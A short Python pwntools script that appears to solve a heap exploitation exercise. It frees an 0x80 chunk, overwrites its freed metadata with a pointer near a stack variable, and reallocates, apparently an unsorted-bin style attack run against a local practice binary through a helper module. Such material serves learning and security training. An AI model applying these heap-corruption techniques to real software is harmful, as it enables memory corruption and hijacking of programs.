from pwn import *
from handle import *

def exploit():
	malloc(0x80)
	malloc(0x80)

	free_chunk(0)
	A = chunk_info(0)

	target = stack_var_1_address()
	write_to_chunk(0, "AAAAAAAA" + p64(target - 2*0x8))

	malloc(0x80)

p = exec_file()
exploit()
p.interactive()
p.close
